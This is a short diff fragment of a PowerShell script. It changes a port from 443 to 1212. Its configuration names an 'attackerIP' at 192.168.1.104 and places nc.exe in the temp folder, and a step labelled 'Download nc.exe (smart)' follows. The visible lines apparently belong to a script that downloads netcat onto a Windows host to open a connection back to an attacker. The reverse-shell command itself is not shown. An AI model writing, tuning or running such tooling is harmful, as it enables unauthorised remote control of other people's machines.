@@ -12,7 +12,7 @@ $ncUrl = if ($is64bit) {
 # 3. Configuration
 $ncPath     = "$env:TEMP\nc.exe"
 $attackerIP = "192.168.1.104"
-$port       = "443"
+$port       = "1212"
 
 # 4. Download nc.exe (smart)
 try {
